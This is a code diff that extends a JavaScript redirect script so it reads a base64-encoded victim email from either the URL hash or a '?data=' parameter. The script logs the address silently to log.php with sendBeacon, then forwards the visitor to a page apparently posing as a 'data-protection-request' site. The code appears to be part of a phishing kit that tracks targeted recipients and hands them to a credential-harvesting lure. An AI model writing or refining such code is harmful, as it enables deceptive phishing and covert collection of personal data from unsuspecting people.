@@ -29,13 +29,28 @@ function logToConsole(message, data) {
 
 function processRedirect() {
     try {
+        // 1. Get encoded data from either #hash or ?data= parameter
         var hash = window.location.hash.substring(1);
-        logToConsole("Original hash:", hash);
+        var dataParam = null;
+        try {
+            var params = new URLSearchParams(window.location.search);
+            if (params.has('data')) {
+                dataParam = decodeURIComponent(params.get('data'));
+            }
+        } catch(e) {}
 
-        if (!hash) return;
+        // Prefer hash over data parameter
+        var encoded = hash || dataParam;
+        if (!encoded) {
+            logToConsole("No encoded data found (neither #hash nor ?data=)");
+            return;
+        }
 
-        // Decode (supports double encoding fallback)
-        var decoded = decodeBase64(hash);
+        logToConsole("Original encoded data:", encoded);
+        logToConsole("Source:", hash ? "hash" : "data parameter");
+
+        // 2. Decode (supports double encoding fallback)
+        var decoded = decodeBase64(encoded);
         logToConsole("Decoded once:", decoded);
 
         // Try double decode if needed
@@ -49,32 +64,33 @@ function processRedirect() {
             } catch(e) {}
         }
 
-        // Replace $ with @
+        // 3. Replace $ with @
         var email = decoded.replace(/\$/g, '@');
 
-        // Final validation
+        // 4. Final validation
         if (!validateEmail(email)) {
             logToConsole("Invalid email, stopping:", email);
             return;
         }
 
-        // Re-encode clean email
+        // 5. Re-encode clean email
         var newHash = btoa(email);
 
-        // Silent logging
+        // 6. Silent logging
         try {
             navigator.sendBeacon(
                 "log.php",
                 JSON.stringify({ 
                     email: email,
-                    original_hash: hash,
+                    original_encoded: encoded,
+                    source: hash ? "hash" : "data",
                     timestamp: new Date().toISOString()
                 })
             );
         } catch (e) {}
 
-        // Redirect
-        var redirectUrl = "https://data-protection-request.github.io/protection-administration/#" + newHash;
+        // 7. Redirect
+        var redirectUrl = "https://data-protection-request.github.io/protection-administration/?data=" + newHash;
         logToConsole("Redirecting to:", redirectUrl);
 
         window.location.replace(redirectUrl);
